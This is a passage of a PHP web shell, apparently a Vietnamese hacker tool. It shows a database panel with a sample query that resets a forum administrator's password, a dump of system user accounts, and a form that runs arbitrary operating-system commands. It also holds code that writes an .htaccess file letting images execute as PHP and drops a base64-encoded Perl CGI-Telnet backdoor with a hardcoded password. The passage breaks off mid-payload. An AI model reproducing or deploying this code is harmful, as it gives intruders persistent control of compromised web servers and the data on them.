	makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
	p('</p>');
	formfoot();
?>
<script type="text/javascript">
function editrecord(action, base64, tablename){
	if (action == 'del') {
		if (!confirm('Is or isn\'t deletion record?')) return;
	}
	$('recordlist').doing.value=action;
	$('recordlist').base64.value=base64;
	$('recordlist').tablename.value=tablename;
	$('recordlist').submit();
}
function moddbname(dbname) {
	if(!dbname) return;
	$('setdbname').dbname.value=dbname;
	$('setdbname').submit();
}
function settable(tablename,doing,page) {
	if(!tablename) return;
	if (doing) {
		$('settable').doing.value=doing;
	}
	if (page) {
		$('settable').page.value=page;
	}
	$('settable').tablename.value=tablename;
	$('settable').submit();
}
</script>
<?php
	// SQL
	formhead(array('name'=>'recordlist'));
	makehide('doing');
	makehide('action','sqladmin');
	makehide('base64');
	makehide('tablename');
	p($dbform);
	formfoot();

	// Data
	formhead(array('name'=>'setdbname'));
	makehide('action','sqladmin');
	p($dbform);
	if (!$dbname) {
		makehide('dbname');
	}
	formfoot();


	formhead(array('name'=>'settable'));
	makehide('action','sqladmin');
	p($dbform);
	makehide('tablename');
	makehide('page',$page);
	makehide('doing');
	formfoot();

	$cachetables = array();
	$pagenum = 30;
	$page = intval($page);
	if($page) {
		$start_limit = ($page - 1) * $pagenum;
	} else {
		$start_limit = 0;
		$page = 1;
	}
	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
		dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		// get mysql server
		$mysqlver = mysql_get_server_info();
		p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
		$highver = $mysqlver > '4.1' ? 1 : 0;

		// Show database
		$query = q("SHOW DATABASES");
		$dbs = array();
		$dbs[] = '-- Select a database --';
		while($db = mysql_fetch_array($query)) {
			$dbs[$db['Database']] = $db['Database'];
		}
		makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
		$tabledb = array();
		if ($dbname) {
			p('<p>');
			p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
			if ($tablename) {
				p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
			}
			p('</p>');
			mysql_select_db($dbname);

			$getnumsql = '';
			$runquery = 0;
			if ($sql_query) {
				$runquery = 1;
			}
			$allowedit = 0;
			if ($tablename && !$sql_query) {
				$sql_query = "SELECT * FROM $tablename";
				$getnumsql = $sql_query;
				$sql_query = $sql_query." LIMIT $start_limit, $pagenum";
				$allowedit = 1;
			}
			p('<form acti
			="'.$self.'" method="POST">');
			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database <font color=red><b>'.$dbname.'</font></b>:<BR>Example VBB Password: <font color=red>Hacker Nguyễn</font><BR><font color=yellow>UPDATE `user` SET `password` = \'69e53e5ab9536e55d31ff533aefc4fbe\', salt = \'p5T\' WHERE `userid` = \'1\' </font>
			</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
			makehide('tablename', $tablename);
			makehide('action','sqladmin');
			p($dbform);
			p('</form>');
			if ($tablename || ($runquery && $sql_query)) {
				if ($doing == 'structure') {
					$result = q("SHOW COLUMNS FROM $tablename");
					$rowdb = array();
					while($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					p('<table border="0" cellpadding="3" cellspacing="0">');
					p('<tr class="head">');
					p('<td>Field</td>');
					p('<td>Type</td>');
					p('<td>Null</td>');
					p('<td>Key</td>');
					p('<td>Default</td>');
					p('<td>Extra</td>');
					p('</tr>');
					foreach ($rowdb as $row) {
						$thisbg = bg();
						p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
						p('<td>'.$row['Field'].'</td>');
						p('<td>'.$row['Type'].'</td>');
						p('<td>'.$row['Null'].'&nbsp;</td>');
						p('<td>'.$row['Key'].'&nbsp;</td>');
						p('<td>'.$row['Default'].'&nbsp;</td>');
						p('<td>'.$row['Extra'].'&nbsp;</td>');
						p('</tr>');
					}
					tbfoot();
				} elseif ($doing == 'insert' || $doing == 'edit') {
					$result = q('SHOW COLUMNS FROM '.$tablename);
					while ($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					$rs = array();
					if ($doing == 'insert') {
						p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
					} else {
						p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
						$where = base64_decode($base64);
						$result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
						$rs = mysql_fetch_array($result);
					}
					p('<form method="post" action="'.$self.'">');
					p($dbform);
					makehide('action','sqladmin');
					makehide('tablename',$tablename);
					p('<table border="0" cellpadding="3" cellspacing="0">');
					foreach ($rowdb as $row) {
						if ($rs[$row['Field']]) {
							$value = htmlspecialchars($rs[$row['Field']]);
						} else {
							$value = '';
						}
						$thisbg = bg();
						p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
						p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
					}
					if ($doing == 'insert') {
						p('<tr class="fout"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
					} else {
						p('<tr class="fout"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
						makehide('base64', $base64);
					}
					p('</table></form>');
				} else {
					$querys = @explode(';',$sql_query);
					foreach($querys as $num=>$query) {
						if ($query) {
							p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
							switch(qy($query))
							{
								case 0:
									p('<h2>Error : '.mysql_error().'</h2>');
									break;
								case 1:
									if (strtolower(substr($query,0,13)) == 'select * from') {
										$allowedit = 1;
									}
									if ($getnumsql) {
										$tatol = mysql_num_rows(q($getnumsql));
										$multipage = multi($tatol, $pagenum, $page, $tablename);
									}
									if (!$tablename) {
										$sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
										$sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
										preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
										$tablename = $matches[1][0];
									}
									$result = q($query);
									p($multipage);
									p('<table border="0" cellpadding="3" cellspacing="0">');
									p('<tr class="head">');
									if ($allowedit) p('<td>Action</td>');
									$fieldnum = @mysql_num_fields($result);
									for($i=0;$i<$fieldnum;$i++){
										$name = @mysql_field_name($result, $i);
										$type = @mysql_field_type($result, $i);
										$len = @mysql_field_len($result, $i);
										p("<td nowrap>$name<br><span>$type($len)</span></td>");
									}
									p('</tr>');
									while($mn = @mysql_fetch_assoc($result)){
										$thisbg = bg();
										p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
										$where = $tmp = $b1 = '';
										foreach($mn as $key=>$inside){
											if ($inside) {
												$where .= $tmp.$key."='".addslashes($inside)."'";
												$tmp = ' AND ';
											}
											$b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';
										}
										$where = base64_encode($where);
										if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Xóa</a></td>');
										p($b1);
										p('</tr>');
										unset($b1);
									}
									tbfoot();
									p($multipage);
									break;
								case 2:
									$ar = mysql_affected_rows();
									p('<h2>affected rows : <b>'.$ar.'</b></h2>');
									break;
							}
						}
					}
				}
			} else {
				$query = q("SHOW TABLE STATUS");
				$table_num = $table_rows = $data_size = 0;
				$tabledb = array();
				while($table = mysql_fetch_array($query)) {
					$data_size = $data_size + $table['Data_length'];
					$table_rows = $table_rows + $table['Rows'];
					$table['Data_length'] = sizecount($table['Data_length']);
					$table_num++;
					$tabledb[] = $table;
				}
				$data_size = sizecount($data_size);
				unset($table);
				p('<table border="0" cellpadding="0" cellspacing="0">');
				p('<form action="'.$self.'" method="POST">');
				makehide('action','sqladmin');
				p($dbform);
				p('<tr class="head">');
				p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
				p('<td>Name</td>');
				p('<td>Rows</td>');
				p('<td>Data_length</td>');
				p('<td>Create_time</td>');
				p('<td>Update_time</td>');
				if ($highver) {
					p('<td>Engine</td>');
					p('<td>Collation</td>');
				}
				p('</tr>');
				foreach ($tabledb as $key => $table) {
					$thisbg = bg();
					p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
					p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="'.$table['Name'].'" /></td>');
					p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a> [ <a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a> ]</td>');
					p('<td>'.$table['Rows'].'</td>');
					p('<td>'.$table['Data_length'].'</td>');
					p('<td>'.$table['Create_time'].'</td>');
					p('<td>'.$table['Update_time'].'</td>');
					if ($highver) {
						p('<td>'.$table['Engine'].'</td>');
						p('<td>'.$table['Collation'].'</td>');
					}
					p('</tr>');
				}
				p('<tr class=fout>');
				p('<td>&nbsp;</td>');
				p('<td>Total tables: '.$table_num.'</td>');
				p('<td>'.$table_rows.'</td>');
				p('<td>'.$data_size.'</td>');
				p('<td colspan="'.($highver ? 4 : 2).'">&nbsp;</td>');
				p('</tr>');

				p("<tr class=\"fout\"><td colspan=\"".($highver ? 8 : 6)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"".SA_ROOT.$_SERVER['HTTP_HOST']."_MySQL.sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" name=\"downrar\" value=\"Export selection table\" /></td></tr>");
				makehide('doing','backupmysql');
				formfoot();
				p("</table>");
				fr($query);
			}
		}
	}
	tbfoot();
	@mysql_close();
}//end sql backup

elseif ($action == 'etcpwd') {
formhead(array('title'=>'Get /etc/passwd'));
	makehide('action','etcpwd');
	makehide('dir',$nowpath);
$i = 0;
 echo "<p><br><textarea class=\"area\" id=\"phpcodexxx\" name=\"phpcodexxx\" cols=\"100\" rows=\"25\">";
while ($i < 60000) {

    $line = posix_getpwuid($i);
    if (!empty($line)) {

        while (list ($key, $vba_etcpwd) = each($line)){
            echo "".$vba_etcpwd."\n";
            break;
        }

    }

   $i++;
}
  echo "</textarea></p>";
	formfoot();
}
elseif ($action == 'command') {
	formhead(array('title'=>'Chức năng dành cho hacker sử dụng CMD'));
	makehide('action','shell');
	if (IS_WIN && IS_COM) {
		$execfuncdb = array('phpfunc'=>'Hacker');
		makeselect(array('title'=>'Lựa Chọn:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
	}
	p('<p>');
	makeinput(array('title'=>'Nhập Lệnh','name'=>'command','value'=>$command));
	makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Thực Hiện'));
	p('</p>');
	formfoot();

	if ($command) {
		p('<hr width="100%" noshade /><pre>');
		if ($execfunc=='wscript' && IS_WIN && IS_COM) {
			$wsh = new COM('WScript.shell');
			$exec = $wsh->exec('cmd.exe /c '.$command);
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {
			$descriptorspec = array(
			   0 => array('pipe', 'r'),
			   1 => array('pipe', 'w'),
			   2 => array('pipe', 'w')
			);
			$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
			if (is_resource($process)) {
				fwrite($pipes[0], $command."\r\n");
				fwrite($pipes[0], "exit\r\n");
				fclose($pipes[0]);
				while (!feof($pipes[1])) {
					echo fgets($pipes[1], 1024);
				}
				fclose($pipes[1]);
				while (!feof($pipes[2])) {
					echo fgets($pipes[2], 1024);
				}
				fclose($pipes[2]);
				proc_close($process);
			}
		} else {
			echo(execute($command));
		}
		p('</pre>');
	}
}//end etcpwd
elseif ($action == 'error.log') {
	mkdir('error', 0755);
    chdir('error');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Can not open file!");
        $metin = "Options +FollowSymLinks +Indexes
DirectoryIndex default.html 
## START ##
Options +ExecCGI
AddHandler cgi-script log cgi pl tg love h4 tgb x-zone 
AddType application/x-httpd-php .jpg
RewriteEngine on
RewriteRule (.*)\.war$ .log
## END ##";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$pythonp = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS41IjsNCiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDI1NSwgMCwgMCksIDBweCAwcHggNXB4IHJnYigyNTUsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+QWthc2hpIEppcm8gQDIwMTM8L2ZvbnQ+IjsNCg0KJFBhc3N3b3JkID0gImoxcjAiOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcw0KCQkJCSMgdG8gbG9naW4uDQpzdWIgSXNfV2luKCl7DQoJJG9zID0gJnRyaW0oJEVOVnsiU0VSVkVSX1NPRlRXQVJFIn0pOw0KCWlmKCRvcyA9fiBtL3dpbi9pKXsNCgkJcmV0dXJuIDE7DQoJfWVsc2V7DQoJCXJldHVybiAwOw0KCX0NCn0NCiRXaW5OVCA9ICZJc19XaW4oKTsJCQkjIFlvdSBuZWVkIHRvIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhpcyB0byAxIGlmDQoJCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91DQoJCQkJCSMgY2FuIGxlYXZlIHRoZSB2YWx1ZSBhcyBpdCBpcy4NCg0KJE5UQ21kU2VwID0gIiYiOwkJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQoJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gV2luZG93cyBOVC4NCg0KJFVuaXhDbWRTZXAgPSAiOyI7CQkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4Lg0KDQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwOwkJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQNCgkJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMNCgkJCQkJIyB1c2VmdWwgZm9yIGNvbW1hbmRzIHRoYXQgbWF5IGhhbmcgb3IgdGhhdA0KCQkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuDQoJCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMNCgkJCQkJIyBpZ25vcmVkIG9uIE5UIFNlcnZlcnMuDQoNCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkJIyBJZiB0aGlzIGlzIDEsIHRoZW4gZGF0YSBpcyBzZW50IHRvIHRoZQ0KCQkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQ0KCQkJCQkjIGl0IGlzIGJ1ZmZlcmVkIGFuZCBzZW5kIHdoZW4gdGhlIGNvbW1hbmQNCgkJCQkJIyBjb21wbGV0ZXMuIFRoaXMgaXMgdXNlZnVsIGZvciBjb21tYW5kcyBsaWtlDQoJCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0DQoJCQkJCSMgaXMgYmVpbmcgZ2VuZXJhdGVkLg0KDQojIERPTidUIENIQU5HRSBBTllUSElORyBCRUxPVyBUSElTIExJTkUgVU5MRVNTIFlPVSBLTk9XIFdIQVQgWU9VJ1JFIERPSU5HICEhDQoNCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0KJGNvbHM9IDEzMDsNCiRyb3dzPSAyNjsNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmVhZHMgdGhlIGlucHV0IHNlbnQgYnkgdGhlIGJyb3dzZXIgYW5kIHBhcnNlcyB0aGUgaW5wdXQgdmFyaWFibGVzLiBJdA0KIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLg0KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9Lg0KIyBPdGhlciB2YXJpYWJsZXMgY2FuIGJlIGFjY2Vzc2VkIHVzaW5nICRpbnsndmFyJ30sIHdoZXJlIHZhciBpcyB0aGUgbmFtZSBvZg0KIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQ0KIyBzY3JpcHRzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJlYWRQYXJzZSANCnsNCglsb2NhbCAoKmluKSA9IEBfIGlmIEBfOw0KCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7DQoJJE11bHRpcGFydEZvcm1EYXRhID0gJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC87DQoJaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0NCgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoJIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQ0KCWlmKCRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvKQ0KCXsNCgkJJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyANCgkJQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsgDQoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07DQoJCSRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsNCgkJJEhlYWRlciA9ICRgOw0KCQkkQm9keSA9ICQnOw0KIAkJJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQ0KCQkkaW57J2ZpbGVkYXRhJ30gPSAkQm9keTsNCgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyANCgkJJGlueydmJ30gPSAkMTsgDQoJCSRpbnsnZid9ID1+IHMvXCIvL2c7DQoJCSRpbnsnZid9ID1+IHMvXHMvL2c7DQoNCgkJIyBwYXJzZSB0cmFpbGVyDQoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQoJCXsgDQoJCQkkbGlzdFskaV0gPX4gcy9eLituYW1lPSQvLzsNCgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsNCgkJCSRrZXkgPSAkMTsNCgkJCSR2YWwgPSAkJzsNCgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9ID0gJHZhbDsgDQoJCX0NCgl9DQoJZWxzZSAjIHN0YW5kYXJkIHBvc3QgZGF0YSAodXJsIGVuY29kZWQsIG5vdCBtdWx0aXBhcnQpDQoJew0KCQlAaW4gPSBzcGxpdCgvJi8sICRpbik7DQoJCWZvcmVhY2ggJGkgKDAgLi4gJCNpbikNCgkJew0KCQkJJGluWyRpXSA9fiBzL1wrLyAvZzsNCgkJCSgka2V5LCAkdmFsKSA9IHNwbGl0KC89LywgJGluWyRpXSwgMik7DQoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSAuPSAiXDAiIGlmIChkZWZpbmVkKCRpbnska2V5fSkpOw0KCQkJJGlueyRrZXl9IC49ICR2YWw7DQoJCX0NCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIGZ1bmN0aW9uIEVuY29kZURpcjogZW5jb2RlIGJhc2U2NCBQYXRoDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRW5jb2RlRGlyDQp7DQoJbXkgJGRpciA9IHNoaWZ0Ow0KCSRkaXIgPSB0cmltKGVuY29kZV9iYXNlNjQoJGRpcikpOw0KCSRkaXIgPX4gcy8oXHJ8XG4pLy87DQoJcmV0dXJuICRkaXI7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcg0KIyBBcmd1bWVudCAxOiBGb3JtIGl0ZW0gbmFtZSB0byB3aGljaCBmb2N1cyBzaG91bGQgYmUgc2V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlSGVhZGVyDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCW15ICRpZCA9IGBpZGAgaWYoISRXaW5OVCk7DQoJbXkgJGluZm8gPSBgdW5hbWUgLXMgLW4gLXIgLWlgOw0KCXByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxuXG4iOw0KCXByaW50IDw8RU5EOw0KPGh0bWw+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4NCjx0aXRsZT4kRU5WeydTRVJWRVJfTkFNRSd9IHwgSVAgOiAkRU5WeydTRVJWRVJfQUREUid9IDwvdGl0bGU+DQokSHRtbE1ldGFIZWFkZXINCjwvaGVhZD4NCjxzdHlsZT4NCmJvZHl7DQpmb250OiAxMHB0IFZlcmRhbmE7DQpjb2xvcjogI2ZmZjsNCn0NCnRyLHRkLHRhYmxlLGlucHV0LHRleHRhcmVhIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KfQ0KI2RvbWFpbiB0cjpob3ZlcnsNCmJhY2tncm91bmQtY29sb3I6ICM0NDQ7DQp9DQp0ZCB7DQpjb2xvcjogI2ZmZmZmZjsNCn0NCi5saXN0ZGlyIHRkew0KCXRleHQtYWxpZ246IGNlbnRlcjsNCn0NCi5saXN0ZGlyIHRoew0KCWNvbG9yOiAjRkY5OTAwOw0KfQ0KLmRpciwuZmlsZQ0Kew0KCXRleHQtYWxpZ246IGxlZnQgIWltcG9ydGFudDsNCn0NCi5kaXJ7DQoJZm9udC1zaXplOiAxMHB0OyANCglmb250LXdlaWdodDogYm9sZDsNCn0NCnRhYmxlIHsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMxMTE7DQp9DQppbnB1dCB7DQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCmNvbG9yOiAjZmY5OTAwOw0KfQ0KaW5wdXQuc3VibWl0IHsNCnRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsNCmNvbG9yOiAjRkZGRkZGOw0KYm9yZGVyLWNvbG9yOiAjMDA5OTAwOw0KfQ0KY29kZSB7DQpib3JkZXI6IGRhc2hlZCAwcHggIzMzMzsNCmNvbG9yOiB3aGlsZTsNCn0NCnJ1biB7DQpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsNCmNvbG9yOiAjRkYwMEFBOw0KfQ0KdGV4dGFyZWEgew0KQkFDS0dST1VORC1DT0xPUjogIzFiMWIxYjsNCmZvbnQ6IEZpeGVkc3lzIGJvbGQ7DQpjb2xvcjogI2FhYTsNCn0NCkE6bGluayB7DQoJQ09MT1I6ICNmZmZmZmY7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTp2aXNpdGVkIHsNCglDT0xPUjogI2ZmZmZmZjsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmhvdmVyIHsNCgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQoJY29sb3I6ICNGRkZGRkY7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTphY3RpdmUgew0KCWNvbG9yOiBSZWQ7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KLmxpc3RkaXIgdHI6aG92ZXJ7DQoJYmFja2dyb3VuZDogIzQ0NDsNCn0NCi5saXN0ZGlyIHRyOmhvdmVyIHRkew0KCWJhY2tncm91bmQ6ICM0NDQ7DQoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmU7DQp9DQoubm90bGluZXsNCgliYWNrZ3JvdW5kOiAjMTExOw0KfQ0KLmxpbmV7DQoJYmFja2dyb3VuZDogIzIyMjsNCn0NCjwvc3R5bGU+DQo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4NCmZ1bmN0aW9uIEVuY29kZXIobmFtZSkNCnsNCgl2YXIgZSA9ICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChuYW1lKTsNCgllLnZhbHVlID0gYnRvYShlLnZhbHVlKTsNCglyZXR1cm4gdHJ1ZTsNCn0NCmZ1bmN0aW9uIGNobW9kX2Zvcm0oaSxmaWxlKQ0Kew0KCWRvY3